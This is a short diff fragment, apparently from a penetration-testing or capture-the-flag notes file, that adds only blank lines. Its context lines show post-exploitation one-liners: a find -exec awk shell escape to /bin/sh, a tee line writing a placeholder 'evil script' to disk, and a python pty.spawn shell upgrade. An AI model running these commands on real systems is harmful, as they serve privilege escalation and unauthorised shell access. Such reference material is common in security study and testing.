@@ -64,3 +64,6 @@ find / -name blahblah —exec /bin/awk 'BEGIN {system("/bin/sh")}' ;
 echo "evil script code" | tee script.sh
 
 python -c 'import pty; pty.spawn("/bin/bash")'
+
+
+
